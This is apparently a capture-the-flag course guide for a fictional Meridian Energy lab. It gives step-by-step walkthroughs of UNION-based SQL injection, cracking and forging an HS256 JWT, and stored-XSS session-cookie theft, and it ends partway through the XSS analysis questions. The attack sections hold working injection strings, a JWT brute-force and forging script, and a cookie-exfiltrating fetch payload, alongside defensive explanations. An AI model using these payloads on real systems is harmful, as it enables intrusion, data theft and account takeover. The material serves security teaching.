docs.title: Before You Begin
docs.text: You should have completed the Chapter 2 Introduction, which describes the three web exploitation exercises in the Meridian Energy engagement. Your VPN must be connected. The employee portal credentials were discovered during reconnaissance and follow the same default password pattern identified in Chapter 1.

docs.title: Scenario
docs.text:
Meridian Energy Group's employee portal includes a search function that lets staff look up colleagues by name. The search feature was built by an internal developer who concatenated user input directly into PostgreSQL queries without parameterization. Your objective is to exploit the SQL injection vulnerability to enumerate the database schema and extract the flag from a hidden system_secrets table.

The employee portal at portal.meridian-energy.corp gates the vulnerable directory search behind a login that accepts the IT Staff credentials recovered during reconnaissance.

Credentials:

Username Password Context d.park@meridian-energy.corp David2024# IT Staff member

Targets:

Hostname IP Offset Role portal.meridian-energy.corp +10 Employee portal with vulnerable search db.meridian-energy.corp +11 PostgreSQL database (not directly accessible)

Database Access

The database server (db.meridian-energy.corp) is not directly accessible from your position. You interact with it indirectly through the SQL injection point in the employee portal. All database queries are executed by the portal's backend.

docs.title: Your Objectives
docs.text:
• Log in to the employee portal with the provided credentials
  • Locate the employee search function
  • Test the search input for SQL injection
  • Determine the number of columns returned by the original query
  • Use UNION SELECT to enumerate the database schema
  • Discover and extract data from the system_secrets table
  • Find and submit the flag in OCR{...} format

Difficulty: Intermediate Estimated time: 35 minutes

docs.title: Beyond Authentication Bypass
docs.text: In Chapter 1, you saw how SQL injection can bypass login forms. UNION-based injection goes further: it extracts arbitrary data from the database by appending a second SELECT statement to the original query.

docs.title: How UNION SELECT Works
docs.text:
The SQL UNION operator combines the results of two SELECT statements into a single result set. For a UNION to succeed, both SELECT statements must return the same number of columns with compatible data types.

If the original query is:

SELECT first_name, last_name, department FROM employees WHERE name LIKE '%user_input%'

An attacker who controls user_input can inject:

' UNION SELECT table_name, column_name, data_type FROM information_schema.columns --

The resulting query becomes:

SELECT first_name, last_name, department FROM employees WHERE name LIKE '%'
UNION SELECT table_name, column_name, data_type FROM information_schema.columns -- %'

The database executes both SELECT statements and returns the combined results. The attacker's injected query reads from information_schema.columns, which catalogs every table and column in the database.

docs.title: Finding the Column Count
docs.text:
Before you can use UNION SELECT, you must determine how many columns the original query returns. Two techniques work:

ORDER BY method - Increment the column number until the query errors:

' ORDER BY 1 --    (works)
' ORDER BY 2 --    (works)
' ORDER BY 7 --    (works)
' ORDER BY 8 --    (error: column 8 does not exist)

The error on 8 means the query returns 7 columns.

UNION NULL method - Add NULL placeholders until the query succeeds:

' UNION SELECT NULL --               (error: different column count)
' UNION SELECT NULL,NULL --          (error)
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --  (success: 7 columns)

docs.title: PostgreSQL Information Schema
docs.text:
PostgreSQL stores metadata about its own structure in the information_schema:

View Contents information_schema.tables All table names and schemas information_schema.columns All column names, data types, and table associations

Query these views through your injection point to map the entire database.

docs.title: Solution Walkthrough
docs.text:
Independent Mode

You know the target, the credentials, and the table name. Try to extract the flag on your own before reading the walkthrough.

docs.title: Step 1: Add Hostname and Log In
docs.text:
Add the portal hostname to your hosts file if not already present.

Kali - Add the portal hostname to /etc/hosts

echo "<target_ip> portal.meridian-energy.corp" | sudo tee -a /etc/hosts

Log in with the IT Staff credentials.

Kali - Log in to the employee portal

curl -s -c cookies.txt -d "email=d.park@meridian-energy.corp&password=David2024#" http://portal.meridian-energy.corp/login -L

If the login succeeds, you should see dashboard content in the response. The -c cookies.txt flag saves the session cookie for subsequent requests.

docs.title: Step 2: Locate the Search Function
docs.text:
Explore the portal to find the employee search feature.

Kali - Access the portal dashboard

curl -s -b cookies.txt http://portal.meridian-energy.corp/dashboard

The dashboard includes an employee directory search. Submitting a query renders results through the search parameter on the dashboard itself, so the search endpoint is /dashboard?search=<query> rather than a separate page.

Kali - Test the search function with a normal query

curl -s -b cookies.txt "http://portal.meridian-energy.corp/dashboard?search=David"

You should see search results containing employee records. Note the format: how many fields are displayed per result (name, email, department, title, etc.). The number of visible fields gives you a starting estimate for the column count.

A benign search renders one row per employee across seven columns, the column shape your UNION SELECT payload has to match exactly.

docs.title: Step 3: Test for SQL Injection
docs.text:
Inject a single quote to break the SQL query syntax.

Kali - Test with a single quote

curl -s -b cookies.txt "http://portal.meridian-energy.corp/dashboard?search='"

If the response contains a database error message (referencing "syntax error," "PostgreSQL," "unterminated string"), the input is being concatenated directly into a SQL query. If you see a generic error page, the application may be catching exceptions, but the vulnerability could still exist.

docs.title: Step 4: Determine the Column Count
docs.text:
Use the ORDER BY technique to find how many columns the original query returns.

Kali - Test ORDER BY with increasing column numbers

curl -s -b cookies.txt "http://portal.meridian-energy.corp/dashboard?search=' ORDER BY 1 --"

Increment the number until you get an error:

Kali - Continue incrementing

curl -s -b cookies.txt "http://portal.meridian-energy.corp/dashboard?search=' ORDER BY 7 --"

Kali - Test one beyond the limit

curl -s -b cookies.txt "http://portal.meridian-energy.corp/dashboard?search=' ORDER BY 8 --"

When ORDER BY 7 succeeds but ORDER BY 8 produces an error, the query returns 7 columns. Record this number; you need it for every UNION SELECT payload.

docs.title: Step 5: Confirm UNION SELECT Works
docs.text:
Test a basic UNION SELECT with the correct number of NULL columns.

Kali - UNION SELECT with 7 NULL columns

curl -s -b cookies.txt "http://portal.meridian-energy.corp/dashboard?search=' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL --"

If the query succeeds without errors, your column count is correct. You may see an empty row in the results, or the NULLs may render as blank fields. The important thing is that no error occurred.

Now test which columns display string data by replacing NULLs with test strings one at a time:

Kali - Identify which columns render as visible text

curl -s -b cookies.txt "http://portal.meridian-energy.corp/dashboard?search=' UNION SELECT 'col1','col2','col3','col4','col5','col6','col7' --"

Look at the response to see which of the test strings (col1 through col7) appear in the rendered output. The visible columns are the ones you will use to exfiltrate data.

docs.title: Step 6: Enumerate Tables in the Database
docs.text:
Use information_schema.tables to discover all tables.

Kali - Extract table names from information_schema

curl -s -b cookies.txt "http://portal.meridian-energy.corp/dashboard?search=' UNION SELECT table_name,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public' --"

The WHERE table_schema='public' filter excludes PostgreSQL system tables and shows only application-specific tables. Read through the results and look for interesting table names. You should see the system_secrets table among the results.

The UNION SELECT payload smuggles information_schema table names into the directory output: system_secrets, employees, and access_logs now appear as injected rows alongside real staff records.

If the first column is not visible in the rendered output, move table_name to a column position you know is displayed:

Kali - Try table_name in a different column position

curl -s -b cookies.txt "http://portal.meridian-energy.corp/dashboard?search=' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public' --"

docs.title: Step 7: Enumerate Columns in system_secrets
docs.text:
Now that you know the target table, find out what columns it contains.

Kali - Extract column names from the system_secrets table

curl -s -b cookies.txt "http://portal.meridian-energy.corp/dashboard?search=' UNION SELECT column_name,data_type,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='system_secrets' --"

The response shows each column name and its data type. Record the column names; you need them for the final extraction query.

docs.title: Step 8: Extract the Flag from system_secrets
docs.text:
With the table name and column names known, extract the data.

Kali - Extract all rows from system_secrets

curl -s -b cookies.txt "http://portal.meridian-energy.corp/dashboard?search=' UNION SELECT secret_name,secret_value,NULL,NULL,NULL,NULL,NULL FROM system_secrets --"

Adjust secret_name and secret_value to match the actual column names you discovered in the previous step. The flag in OCR{...} format should appear in one of the returned rows.

If the column names differ from the example, adapt your query accordingly:

Kali - Search the extracted data for the flag

curl -s -b cookies.txt "http://portal.meridian-energy.corp/dashboard?search=' UNION SELECT secret_name,secret_value,NULL,NULL,NULL,NULL,NULL FROM system_secrets --" | grep -o "OCR{[^}]*}"

Submit the flag in the platform.

docs.title: Analysis Questions
docs.text:
1. Why must a UNION SELECT have the same number of columns as the original query? What happens if the count is wrong?

Reveal Answer

The SQL UNION operator combines two result sets into a single table. For the combination to work, both SELECT statements must produce rows with the same number of columns. If the column counts differ, the database cannot align the rows and returns an error (e.g., "each UNION query must have the same number of columns"). The attacker must determine the exact column count before any data extraction is possible, which is why the ORDER BY or NULL-padding technique is always the first step in UNION-based injection.

2. The injection payload used a double-dash comment (--) at the end. What purpose does the comment serve, and what would happen without it?

Reveal Answer

The double-dash (--) is a SQL comment that causes the database to ignore everything after it on the same line. In the vulnerable query, the original code appends a closing quote and additional syntax (like %') after the user's input. Without the comment, the injected UNION SELECT would be followed by the original query's remaining syntax, producing a syntax error. The comment effectively truncates the rest of the original query, allowing the injected portion to execute cleanly. Some databases require a space after -- for it to be recognized as a comment.

3. The application used string concatenation to build SQL queries. What is the correct way to handle user input in database queries, and why does it prevent injection?

Reveal Answer

Parameterized queries (also called prepared statements) are the correct approach. Instead of embedding user input directly in the query string, the application defines the query structure with placeholders: SELECT * FROM employees WHERE name LIKE $1. The database receives the query template and the user input as separate values. Because the database knows that the parameter is always data (never SQL code), injected syntax like ' UNION SELECT is treated as a literal search string rather than SQL commands. Every modern database driver supports parameterized queries, and there is no performance penalty for using them.

4. You discovered the system_secrets table by querying information_schema.tables. What other reconnaissance could an attacker perform through the information_schema?

Reveal Answer

The information_schema exposes the complete database structure. An attacker can enumerate every table (information_schema.tables), every column and its data type (information_schema.columns), every database user and their privileges (information_schema.role_table_grants), and every constraint including foreign keys (information_schema.table_constraints). With this metadata, the attacker can systematically extract data from any table in the database. Beyond information_schema, PostgreSQL-specific catalogs like pg_user and pg_shadow may expose password hashes, and pg_settings reveals server configuration including file paths and memory limits.

docs.title: Key Takeaways
docs.text:
• UNION-based SQL injection extracts arbitrary data from the database. Once you find an injection point and determine the column count, you can read any table the database user has access to.
  • The column count must match exactly. ORDER BY and NULL-padding are the standard techniques for determining the correct number.
  • information_schema is the attacker's roadmap. Querying it reveals every table, column, and data type in the database.
  • String concatenation in SQL queries is the root cause. Parameterized queries eliminate SQL injection entirely by separating code from data.
  • A low-privilege application account can still access sensitive tables. Unless the database enforces row-level security or restricts access to specific schemas, any query the application can run, the attacker can run through the injection point.

docs.title: What is Next
docs.text: In Exercise MEG2.2, you will attack the HR portal's authentication system. The portal uses JSON Web Tokens (JWTs) with a weak signing secret. You will decode the token, crack the secret, forge an admin token, and access the internal API.

docs.title: Before You Begin
docs.text: You should have completed Exercise MEG2.1 (Portal SQL Injection). Your VPN must be connected. The HR portal credentials are the same ones you used in Chapter 1 (MEG1.2). In this exercise, you will go beyond logging in: you will crack the JWT signing secret, forge an admin token, and access the internal API.

docs.title: Scenario
docs.text:
Meridian Energy Group's HR portal uses JSON Web Tokens (JWTs) for session management. After logging in as Karen Mitchell (HR Director), the server issues a JWT cookie that contains the user's role. The JWT is signed with HS256 using a weak secret: the company name "meridian." Your objective is to decode the token, crack the signing secret, forge a new token with the role changed to "admin," and use the admin session to discover an internal API. Querying the API with the credentials found on the admin panel reveals the flag.

The HR portal login hands Karen Mitchell an HS256-signed JWT cookie whose role claim you will rewrite once the weak signing secret falls.

Credentials:

Username Password Context k.mitchell@meridian-energy.corp Karen2024# HR Director

Targets:

Hostname IP Offset Role hr.meridian-energy.corp +10 HR portal with JWT authentication api.meridian-energy.corp +11 Internal API (discovered from admin panel)

docs.title: Your Objectives
docs.text:
• Log in to the HR portal and capture the JWT from the session cookie
  • Decode the JWT payload to understand its structure (user, role, expiry)
  • Crack the HS256 signing secret
  • Forge a new JWT with the role set to "admin"
  • Access the admin panel using the forged token
  • Discover internal API credentials on the admin panel
  • Query the internal API to extract the flag
  • Submit the flag in OCR{...} format

Difficulty: Intermediate Estimated time: 35 minutes

docs.title: Token Structure
docs.text:
A JWT consists of three Base64URL-encoded parts separated by dots:

eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiay5taXRjaGVsbCIsInJvbGUiOiJzdGFmZiJ9.signature
Part Contains Encoded Header Algorithm and token type {"alg":"HS256","typ":"JWT"} Payload Claims (user data, role, expiry) {"user":"k.mitchell","role":"staff"} Signature HMAC of header + payload using the secret key Binary hash

The server creates the token at login and sends it as a cookie. On each subsequent request, the browser sends the cookie back. The server verifies the signature to confirm the token was not tampered with.

docs.title: Why Weak Secrets Are Dangerous
docs.text: HS256 uses a symmetric key: the same secret both signs and verifies the token. If the secret is weak (a dictionary word, a company name, a short string), an attacker can brute-force it offline. Once the secret is known, the attacker can forge tokens with any claims they choose: changing their role to admin, changing their user ID, or extending the expiry indefinitely.

docs.title: Cracking the Secret
docs.text:
The attack works offline because the attacker already has a valid token (captured from their own session). They try candidate secrets one at a time, signing the header and payload with each candidate, and comparing the result to the known-good signature. When the signatures match, the candidate is the secret.

flowchart LR
    A["Capture JWT"] --> B["Decode Header + Payload"]
    B --> C["Try candidate secret"]
    C --> D{"Signature match?"}
    D -->|No| C
    D -->|Yes| E["Secret found"]
    E --> F["Forge new token<br/>role = admin"]

docs.text: Tool Purpose Example curl HTTP requests and cookie capture curl -s -c cookies.txt http://target/login python3 Base64 decoding and token forging python3 -c "import base64; ..." jwt_tool (optional) JWT analysis, cracking, and forging python3 jwt_tool.py <token> -C -d wordlist

docs.title: Solution Walkthrough
docs.text:
Independent Mode

You know the signing secret is "meridian" and the target role is "admin." Try forging the token and finding the API on your own.

docs.title: Step 1: Add Hostnames and Log In
docs.text:
Ensure both hostnames are in your hosts file.

Kali - Add hostnames to /etc/hosts

echo "<target_ip_10> hr.meridian-energy.corp" | sudo tee -a /etc/hosts
echo "<target_ip_11> api.meridian-energy.corp" | sudo tee -a /etc/hosts

Log in to the HR portal and capture the JWT cookie.

Kali - Log in and save cookies

curl -s -v -c cookies.txt -d "email=k.mitchell@meridian-energy.corp&password=Karen2024#" http://hr.meridian-energy.corp/login -L 2>&1 | grep -i "set-cookie"

The -v flag enables verbose output so you can see response headers. Look for a Set-Cookie header containing the JWT. The cookie name may be token, session, jwt, or similar. Record the full token value.

Alternatively, check the saved cookies file:

Kali - View the saved cookies

cat cookies.txt

Look for the JWT value. It will be a long string with two dots separating three Base64-encoded sections.

docs.title: Step 2: Decode the JWT Payload
docs.text:
A JWT payload is Base64URL-encoded. You can decode it without knowing the secret, because the signature only protects integrity, not confidentiality.

Kali - Decode the JWT payload with Python

python3 -c "
import base64, json, sys
token = '<paste_your_jwt_here>'
parts = token.split('.')
# Add padding if needed
payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
decoded = base64.urlsafe_b64decode(payload)
print(json.dumps(json.loads(decoded), indent=2))
"

Replace <paste_your_jwt_here> with the actual token from your cookie. The output shows the claims in the token payload. Look for fields like:

  • user or sub - the username
  • role - the user's authorization level (likely "staff" or "user")
  • exp - the token expiry timestamp

Record the exact field names and values. You need to know the structure to forge a valid admin token.

docs.title: Step 3: Decode the JWT Header
docs.text:
Decode the first part of the token to confirm the signing algorithm.

Kali - Decode the JWT header

python3 -c "
import base64, json
token = '<paste_your_jwt_here>'
header = token.split('.')[0] + '=' * (4 - len(token.split('.')[0]) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(header)), indent=2))
"

Confirm the algorithm is HS256. HS256 uses HMAC-SHA256 with a symmetric secret key, which means cracking the secret gives you full control over token generation.

docs.title: Step 4: Crack the JWT Signing Secret
docs.text:
The secret is the company name: "meridian." You can verify this by signing the known header and payload with the candidate secret and comparing the result to the original signature.

Kali - Verify the signing secret with Python

python3 -c "
import hmac, hashlib, base64
token = '<paste_your_jwt_here>'
parts = token.split('.')
signing_input = parts[0] + '.' + parts[1]
secret = 'meridian'
sig = base64.urlsafe_b64encode(
    hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
).rstrip(b'=').decode()
original_sig = parts[2]
print(f'Computed: {sig}')
print(f'Original: {original_sig}')
print(f'Match: {sig == original_sig}')
"

If Match: True is printed, the secret is confirmed. In a real engagement, you would use a wordlist-based approach if the secret is not immediately obvious:

Kali - Brute-force the secret with a wordlist (alternative approach)

python3 -c "
import hmac, hashlib, base64
token = '<paste_your_jwt_here>'
parts = token.split('.')
signing_input = (parts[0] + '.' + parts[1]).encode()
original_sig = parts[2]
candidates = ['password', 'secret', 'meridian', 'energy', 'admin', 'default']
for word in candidates:
    sig = base64.urlsafe_b64encode(
        hmac.new(word.encode(), signing_input, hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    if sig == original_sig:
        print(f'Secret found: {word}')
        break
"

The script tries each candidate word as the signing secret and reports a match when found.

docs.title: Step 5: Forge an Admin Token
docs.text:
Now that you know the secret, create a new JWT with the role changed to "admin."

Kali - Forge a JWT with admin role

python3 -c "
import hmac, hashlib, base64, json, time

header = {'alg': 'HS256', 'typ': 'JWT'}
payload = {
    'user': 'k.mitchell@meridian-energy.corp',
    'role': 'admin',
    'exp': int(time.time()) + 3600
}
secret = 'meridian'

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

h = b64url(json.dumps(header, separators=(',', ':')).encode())
p = b64url(json.dumps(payload, separators=(',', ':')).encode())
sig = b64url(hmac.new(secret.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest())
print(f'{h}.{p}.{sig}')
"

The script creates a new JWT header and payload, signs them with the cracked secret, and outputs the complete forged token. Copy the entire output string.

Payload Field Names

Make sure the field names in your forged payload match exactly what you saw when decoding the original token in Step 2. If the original used sub instead of user, or authorization instead of role, adjust accordingly.

docs.title: Step 6: Access the Admin Panel
docs.text:
Replace your session cookie with the forged token and access the admin panel.

Kali - Access the admin panel with the forged JWT

curl -s -b "token=<forged_jwt_here>" http://hr.meridian-energy.corp/admin

Replace token with the actual cookie name from Step 1, and <forged_jwt_here> with the token you generated in Step 5. If the forged token is accepted, you will see the admin panel content.

Read the response carefully. Look for:

  • Internal API endpoint URLs
  • API keys or authentication tokens
  • Service account credentials
  • References to other internal systems

The admin panel should reveal an internal API at api.meridian-energy.corp along with credentials or an API key needed to access it.

The forged admin token unlocks the administration panel, which discloses the internal API server and its admin API key, the next pivot toward the flag.

docs.title: Step 7: Query the Internal API
docs.text:
Using the credentials or API key found on the admin panel, query the internal API.

Kali - Query the internal API with discovered credentials

curl -s -H "Authorization: Bearer <api_key>" http://api.meridian-energy.corp/

If the API uses a different authentication method (Basic auth, API key header, etc.), adjust accordingly based on what the admin panel disclosed:

Kali - Alternative: API key in a custom header

curl -s -H "X-API-Key: <api_key>" http://api.meridian-energy.corp/

Kali - Alternative: Basic authentication

curl -s -u "<username>:<password>" http://api.meridian-energy.corp/

Explore the API response. Look for endpoints that return sensitive data or the flag directly. Common paths include /secrets, /flag, /data, or /v1/.

Kali - Search API responses for the flag

curl -s -H "Authorization: Bearer <api_key>" http://api.meridian-energy.corp/ | grep -o "OCR{[^}]*}"

Submit the flag in the platform.

docs.title: Analysis Questions
docs.text:
1. Why is the company name a poor choice for a JWT signing secret? What properties should a signing secret have?

Reveal Answer

The company name is publicly known, short, and easily guessable. An attacker who captures any valid token can test common words (including the company name) against the signature offline, with no rate limiting or lockout. A strong JWT signing secret should be at least 256 bits (32 bytes) of cryptographically random data, generated by a secure random number generator. It should not be a dictionary word, a name, or any predictable value. Secrets should also be rotated periodically and stored securely (in a secrets manager, not in source code).

2. The JWT payload contained the user's role. Why is storing authorization data in a client-side token risky?

Reveal Answer

Client-side tokens are visible to the user and can be decoded without the signing secret (Base64 is encoding, not encryption). If the signing secret is compromised, the attacker can modify the role claim to escalate their privileges. Even with a strong secret, storing sensitive authorization data in the token means that any token leak (logging, URL parameters, browser history) exposes the user's role. A more secure approach stores only a session identifier in the token and looks up the user's role from the database on each request. The server-side approach ensures that role changes (promotions, demotions, revocations) take effect immediately.

3. What is the difference between HS256 and RS256, and why would RS256 have prevented this attack?

Reveal Answer

HS256 (HMAC-SHA256) is symmetric: the same secret key signs and verifies tokens. Anyone who knows the secret can both create and validate tokens. RS256 (RSA-SHA256) is asymmetric: a private key signs tokens and a public key verifies them. With RS256, only the server holding the private key can create valid tokens. Even if the public key is exposed (which is expected), an attacker cannot forge tokens because they lack the private key. The HS256 attack in this exercise required cracking a single shared secret. With RS256, the attacker would need to steal the server's private key, which is a much harder target.

4. The admin panel disclosed API credentials. What principle of secure design does this violate, and how should API credentials be managed?

Reveal Answer

Displaying API credentials on a web panel violates the principle of least privilege and secure credential management. API keys should be stored in a secrets manager (such as HashiCorp Vault or AWS Secrets Manager), accessed programmatically by authorized services, and never displayed in web interfaces. If administrative access to the credentials is necessary, it should require multi-factor authentication, generate audit logs, and display the credential only briefly (or allow only rotation, not viewing). The admin panel should also enforce role-based access to ensure that only specifically authorized administrators can view sensitive configuration.

docs.title: Key Takeaways
docs.text:
• JWTs are transparent by design. The payload is Base64-encoded, not encrypted. Anyone can read the claims without the signing secret.
  • Weak signing secrets allow token forgery. If the secret is a dictionary word or predictable string, offline cracking is trivial.
  • HS256 is symmetric. Knowing the secret lets you both verify and create tokens. RS256 asymmetric signing prevents this class of attack.
  • Authorization data in client-side tokens must be verified server-side. Trusting the role claim in a JWT without server-side validation gives attackers a privilege escalation path.
  • Admin panels should never display secrets in the clear. API keys and credentials require secure storage, audited access, and rotation policies.

docs.text: In Exercise MEG2.3, you will exploit the IT helpdesk's stored XSS vulnerability. By injecting JavaScript into a support ticket, you will steal the admin's session cookie when they review your ticket, then use the stolen session to access the admin panel.

docs.title: Before You Begin
docs.text: You should have completed Exercises MEG2.1 and MEG2.2. Your VPN must be connected. The IT helpdesk uses the same default credential pattern discovered in Chapter 1. In this exercise, you will craft a stored XSS payload, steal an admin session cookie, and use it to access the admin panel.

docs.title: Scenario
docs.text:
Meridian Energy Group operates an IT helpdesk where employees submit support tickets. The helpdesk application does not sanitize ticket content before rendering it in the browser. Tom Bradley, the IT administrator, reviews every ticket that is submitted. When Tom views a ticket containing malicious JavaScript, the script executes in his browser session.

The helpdesk provides a /api/webhook endpoint intended for notification integrations. You will use this endpoint to exfiltrate Tom's session cookie. After capturing his cookie, you will replace your own session cookie with his to access the admin panel and retrieve the flag.

The helpdesk ticket form takes a free-text description that the application later renders without sanitization, the injection point for your stored XSS payload.

Credentials:

Username Password Context d.park@meridian-energy.corp David2024# IT Staff member

Target:

Hostname IP Offset Role helpdesk.meridian-energy.corp +10 IT helpdesk with stored XSS vulnerability

docs.title: Your Objectives
docs.text:
• Log in to the IT helpdesk as David Park
  • Create a test ticket to verify that HTML is rendered without sanitization
  • Craft a stored XSS payload that sends the victim's cookie to the webhook endpoint
  • Submit the malicious ticket and trigger admin review
  • Retrieve the captured admin session cookie from the webhook logs
  • Replace your cookie with the admin's cookie

  • Submit the flag in OCR{...} format

Difficulty: Intermediate Estimated time: 30 minutes

docs.title: What is XSS?
docs.text: Cross-site scripting (XSS) is a vulnerability that allows an attacker to inject client-side scripts (usually JavaScript) into web pages viewed by other users. The browser executes the injected script because it trusts all content from the web server.

docs.title: Types of XSS
docs.text:
Type Storage Trigger Persistence Reflected In the URL/request Victim clicks a crafted link One-time Stored In the database Victim views the page Permanent until removed DOM-based In the client-side code Victim's browser processes input Varies

Stored XSS is the most dangerous type because the payload persists in the application's database. Every user who views the affected page triggers the script, and the attacker does not need to trick the victim into clicking a specific link.

docs.title: How Stored XSS Works
docs.text:
sequenceDiagram
    participant Attacker
    participant Helpdesk
    participant Database
    participant Admin

    Attacker->>Helpdesk: Submit ticket with <script> tag
    Helpdesk->>Database: Store ticket (unsanitized)
    Admin->>Helpdesk: View ticket list
    Helpdesk->>Database: Fetch ticket content
    Database->>Helpdesk: Return raw HTML/JS
    Helpdesk->>Admin: Render page with injected script
    Note over Admin: Script executes in admin's browser
    Admin->>Attacker: Cookie sent to webhook
  1. The attacker submits a ticket containing a <script> tag
  2. The application stores the ticket content in the database without sanitization
  3. When the admin views the ticket, the browser receives the raw HTML including the script
  4. The browser executes the script in the context of the admin's session
  5. The script reads document.cookie and sends it to the attacker's collection endpoint

docs.title: Cookie Theft via XSS
docs.text:
The JavaScript document.cookie property contains all cookies for the current domain that are not marked HttpOnly. A malicious script can read this value and transmit it to an attacker-controlled endpoint:

fetch('/api/webhook', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({data: document.cookie})
})

The HttpOnly flag on a cookie prevents JavaScript from reading it. If the session cookie has HttpOnly set, the XSS payload cannot steal it directly. In this exercise, the helpdesk session cookie is not marked HttpOnly.

docs.title: Solution Walkthrough
docs.text:
Independent Mode

You know the vulnerability type (stored XSS), the exfiltration endpoint (/api/webhook), and the trigger mechanism ("Report to Admin" button). Try crafting the payload and stealing the session on your own.

docs.title: Step 1: Add Hostname and Log In
docs.text:
Kali - Add the helpdesk hostname to /etc/hosts

echo "<target_ip> helpdesk.meridian-energy.corp" | sudo tee -a /etc/hosts

Kali - Log in to the helpdesk

curl -s -v -c cookies.txt -d "email=d.park@meridian-energy.corp&password=David2024#" http://helpdesk.meridian-energy.corp/login -L 2>&1 | grep -i "set-cookie"

Confirm the login succeeded by accessing the dashboard:

Kali - Verify login by accessing the dashboard

curl -s -b cookies.txt http://helpdesk.meridian-energy.corp/dashboard

You should see the helpdesk interface with options to create tickets, view your tickets, and browse the knowledge base.

docs.title: Step 2: Create a Test Ticket with HTML
docs.text:
Before crafting the attack payload, verify that the helpdesk renders HTML in ticket content. Submit a ticket with a bold tag to see if it renders or gets escaped.

Kali - Submit a test ticket with HTML

curl -s -b cookies.txt -d "subject=Test Ticket&body=<b>bold text test</b>" http://helpdesk.meridian-energy.corp/tickets/new

After submitting, view the ticket to check whether the HTML was rendered or escaped:

Kali - View your submitted ticket

curl -s -b cookies.txt http://helpdesk.meridian-energy.corp/tickets

Look at the ticket body in the response. If you see <b>bold text test</b> rendered as literal HTML tags (escaped), the application sanitizes input. If the text appears bold (the <b> tags are interpreted by the browser), the application does not sanitize ticket content. In a curl response, look for the raw <b> tags in the HTML source: if they are present without being converted to <b>, the XSS vector is viable.

docs.title: Step 3: Test JavaScript Execution
docs.text:
Escalate from HTML to JavaScript. Submit a ticket containing a simple script that triggers an alert.

Kali - Submit a ticket with a script tag

curl -s -b cookies.txt --data-urlencode "subject=Printer Issue" --data-urlencode "body=<script>alert('XSS')</script>" http://helpdesk.meridian-energy.corp/tickets/new

View the ticket and check whether the <script> tag is present in the raw HTML response:

Kali - Check if the script tag is stored unescaped

curl -s -b cookies.txt http://helpdesk.meridian-energy.corp/tickets | grep "script"

If the <script> tags appear in the response without being escaped to <script>, the application stores and renders JavaScript. Any user viewing the ticket will execute the script.

A demonstrator payload stored in the ticket body executes when the page loads, painting the red banner across the top: every viewer of the ticket, including the admin who clicks Report to Admin, runs your JavaScript.

docs.title: Step 4: Verify the Webhook Endpoint
docs.text:
Before crafting the exfiltration payload, confirm the webhook endpoint accepts data and has a logs endpoint.

Kali - Send a test POST to the webhook

curl -s -X POST -H "Content-Type: application/json" -d '{"data":"test_webhook"}' http://helpdesk.meridian-energy.corp/api/webhook

Check if the test data was recorded:

Kali - Check webhook logs for the test entry

curl -s http://helpdesk.meridian-energy.corp/api/webhook/logs

If you see your test data in the logs, the webhook endpoint is working and you can use it to receive the stolen cookie.

docs.title: Step 5: Craft the XSS Cookie-Theft Payload
docs.text:
Build a script tag that reads the admin's cookie and sends it to the webhook.

Kali - Submit a ticket with the cookie-stealing payload

curl -s -b cookies.txt \
  --data-urlencode "subject=VPN Access Request" \
  --data-urlencode "body=<script>fetch('/api/webhook',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:document.cookie})})</script>" \
  http://helpdesk.meridian-energy.corp/tickets/new

The payload does the following:

  1. document.cookie reads all non-HttpOnly cookies from the victim's browser session
  2. JSON.stringify({data: document.cookie}) wraps the cookie string in a JSON object
  3. fetch('/api/webhook', ...) sends a POST request to the webhook endpoint
  4. The request originates from the victim's browser, so it uses the helpdesk's origin

The ticket subject ("VPN Access Request") is innocuous enough that the admin will not be suspicious when reviewing it.

docs.title: Step 6: Trigger Admin Review
docs.text:
The helpdesk has a "Report to Admin" feature that causes Tom Bradley (the admin) to review the ticket. Use it to trigger the XSS execution.

Kali - Report the ticket to the admin for review

curl -s -b cookies.txt -X POST http://helpdesk.meridian-energy.corp/tickets/<ticket_id>/report

Replace <ticket_id> with the ID of the ticket you created in Step 5. You can find the ticket ID from the response when you created the ticket, or by listing your tickets:

Kali - List your tickets to find the ID

curl -s -b cookies.txt http://helpdesk.meridian-energy.corp/tickets

After reporting, the admin bot simulates Tom Bradley opening the ticket. The malicious script executes in his browser session and sends his cookie to the webhook.

docs.title: Step 7: Retrieve the Stolen Cookie
docs.text:
Check the webhook logs for the captured session cookie.

Kali - Check webhook logs for the admin's cookie

curl -s http://helpdesk.meridian-energy.corp/api/webhook/logs

Look for an entry that contains a session cookie value different from your own. The entry should contain a cookie string with a session token. Copy the entire cookie value (name=value format).

Identifying the Admin Cookie

The webhook logs may contain your test entry from Step 4 and your own cookie from when you viewed the ticket. The admin's cookie will be a different value, typically the most recent entry after you triggered the admin review.

docs.title: Step 8: Access the Admin Panel with the Stolen Session
docs.text:
Replace your session cookie with the admin's cookie and access the admin panel.

Kali - Access the admin panel using the stolen cookie

curl -s -b "<cookie_name>=<stolen_cookie_value>" http://helpdesk.meridian-energy.corp/admin

Replace <cookie_name> with the cookie name (e.g., session, token) and <stolen_cookie_value> with the value captured from the webhook logs.

If the cookie is valid, you will see the admin panel content. Read through the page for the flag.

Kali - Search the admin panel for the flag

curl -s -b "<cookie_name>=<stolen_cookie_value>" http://helpdesk.meridian-energy.corp/admin | grep -o "OCR{[^}]*}"

Submit the flag in the platform.

docs.title: Analysis Questions
docs.text:
1. Why is stored XSS more dangerous than reflected XSS?

Reveal Answer

Stored XSS persists in the application's database and executes every time any user views the affected page. The attacker submits the payload once, and it runs automatically against every future visitor without any additional interaction. Reflected XSS, by contrast, requires the attacker to trick each victim into clicking a specifically crafted URL. Stored XSS has a wider blast radius, requires no social engineering after the initial injection, and is harder for the victim to detect because the malicious content appears to come from a trusted page they navigate to normally.

